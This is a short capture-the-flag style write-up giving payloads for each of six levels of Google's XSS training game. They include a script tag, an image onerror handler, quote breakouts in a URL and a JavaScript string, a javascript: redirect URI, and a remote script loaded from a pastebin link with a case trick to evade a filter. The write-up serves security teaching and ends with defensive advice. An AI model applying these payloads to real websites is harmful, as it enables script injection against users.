# 🛡️ XSS Game Solutions 🛡️  
---  
**https://xss-game.appspot.com/**  
Hello there, thank you sooo much for reading! 😊  
Here are my solutions to the Google XSS game.  
⚠️ *Note: Some challenges don’t work on every browser—try multiple ones!*  

---

## 🧠 Level 1: Hello, world of XSS  
**Solution:** `<script> alert("hi") </script>`  

- 🚀 Simply inject a `<script>` tag with the `alert()` function.  

---

## 🖼️ Level 2: Persistence is key  
**Solution:** `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`  

- 🛡️ Exploit the `onerror` event by posting a broken image.  
- 🧠 `String.fromCharCode(88,83,83)` decodes to "XSS" (88=X, 83=S).  

---

## 🔍 Level 3: That sinking feeling...  
**Solution:** `http://xss-game.appspot.com/level3/frame#1`' onerror="alert('XSS')"`  

- 🌐 Inject into the URL bar.  
- 🔄 Use a `'` to break the frame URL, triggering `onerror`.  
- ⚠️ *Works in Chrome but not all browsers!*  

---

## 🔑 Level 4: Context matters  
**Solution:** `');alert('xss`  

- 🔄 Escape the existing function with `');`  
- 🧠 Inject `alert('xss')` to execute the payload.  

---

## 🔌 Level 5: Breaking protocol  
**Solution:** `http://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("XSS")`  

- 🛠️ Press **Sign Up**, then modify the `next` parameter to run JS.  
- 🚀 `javascript:alert("XSS")` executes directly.  

---

## 📁 Level 6: Follow the white rabbit  
**Solution:** `http://xss-game.appspot.com/level6/frame#hTTP://pastebin.com/raw/ycjGCXDY`  

- 📄 Paste `alert("XSS");` on [Pastebin](https://pastebin.com/).  
- 🔄 Get the raw link and inject it into the URL.  
- 🔄 Modify `http` to `hTTP` to bypass basic filters.  

---

## 🎉 Final Thoughts 🎉  
- 🧪 Always validate/sanitize user input.  
- 🛡️ Use **Content Security Policy (CSP)** to block unauthorized scripts.  
- 🌐 Stay curious and test securely!  

*Happy hacking!* 🧠💥
